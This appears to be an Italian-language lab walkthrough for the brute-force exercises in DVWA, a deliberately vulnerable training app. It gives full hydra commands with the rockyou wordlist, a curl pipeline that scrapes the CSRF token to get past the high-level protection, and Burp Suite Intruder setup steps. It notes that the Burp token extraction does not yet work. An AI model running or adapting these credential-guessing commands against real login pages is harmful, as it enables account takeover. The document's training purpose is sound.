## Brute force

- https://www.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)
- http://www.symantec.com/connect/articles/password-crackers-ensuring-security-your-password
- http://www.sillychicken.co.nz/Security/how-to-brute-force-http-forms-in-windows.html


### Brute force - Low

Exploit:

- recupera un PHPSESSID valido (`$1`)

- lancia:

	`$ hydra -l admin -P rockyou.txt 172.17.0.2 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=low"`

	parametri http-get-form: `"<RELATIVE PATH>:<PARAMETERS>:<FAILED LOGIN TEXT>:H=Cookie: <REQUEST COOKIES>"`

### Brute force - Medium

Exploit:

- recupera un PHPSESSID valido (`$1`)

- lancia:

	`$ hydra -l admin -P rockyou.txt localhost http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: PHPSESSID=$1; security=medium" -c 3 -t 1`

	dalla man page di hydra:

		```
		-c TIME
			the wait time in seconds per login attempt over all threads (-t 1 is recommended)
			This usually only makes sense if a low task number is used, .e.g -t 1
		-t TASKS
			run TASKS number of connects in parallel (default: 16)
		```

### Brute force - High

È necessario prima fare una GET, recuperare il CSRF token (`user_token`) e fare una seconda GET includendo il valore recuperato.

**curl**

- recupera un PHPSESSID valido (`$1`)

- lancia:

	- recupera il CSRF token

		`
			$ CSRF=$( \
				curl -s --cookie "PHPSESSID=$1; security=high" 'http://172.17.0.2/vulnerabilities/brute/' | \
				awk -F 'value=' '/user_token/ {print $2}' | \
				cut -d "'" -f2)
		`

	- usa il CSRF token per tentare un login

		`$ curl -b dvwa.cookie http://172.17.0.2/vulnerabilities/brute?username=admin&password=password&user_token=${CSRF}&Login=Login`

**BurpSuite**

Configura Burp

- imposta il proxy Burp sul browser
- esegui un tentativo di login

Imposta la Macro

- `Project Options` -> `Sessions` -> `Session Handling Rules` -> `Add`
- `Rule Description`: DVWA Brute High
- `Rule Action` -> `Add` -> `Run a macro`
- `Select macro` -> `Add`
- `Macro Recorder` -> scegli la richiesta tramite cui hai eseguito il tentativo di login -> `OK`
- `Macro description`: Get user_token
- `Configure item`
- `Custom parameters locations in response` -> `Add`
- `Parameter name`: user_token
- `Start after expression`: user_token' value='
- `End at delimiter`: ' />
- `Ok` -> `Ok` -> `Ok`
- abilita `Tolerate URL mismatch when matching parameters (use for URL-agnostic CSRF tokens)`
- `Ok`
- `Scope` -> `Tool Scope -> Only select: Intruder`
- `URL Scope` -> `Use Suite scope [defined in Target tab]`
- `Ok`
- `Target` -> `Site map` -> `<indirizzo IP DVWA>` -> Click destro: `Add to scope`

Prepara l'Intruder

- `Proxy` -> `HTTP History` -> trova la richiesta tramite cui hai eseguito il tentativo di login
- Click destro -> `Send to Intruder`
- `Intruder` -> `2` -> `Positions`
- `Attack type`: `Cluster bomb`
- `Clear §`
- Seleziona il valore dell'username nella query string -> `Add §`
- Seleziona il valore della password nella query string -> `Add §`
- `Intruder` -> `2` -> `Payloads`

- `Payload Sets` -> `Payload Sets`: `1` -> `Payload type`: `Simple list`
- `Payload Options [Simple list]` -> `Add` : `admin` -> `Add`
- `Payload Sets` -> `Payload Sets`: `2` -> `Payload type`: `Simple list`
- `Payload Options [Simple list]` -> `Load ...` : scegli wordlist di password
- `Intruder` -> `2` -> `Options`
- `Attack Results` -> disabilita `Make unmodified baseline request`
- `Grep` - `Extract` -> `Add`
- Start after expression: `<pre><br />`
- End at delimiter: `</pre>`
- `Ok`
- `Intruder` -> `Target` -> `Start attack`

\#FIXME: dopo la prima richiesta, Burp non estrae l'user_token e non lo inserisce nella richiesta successiva

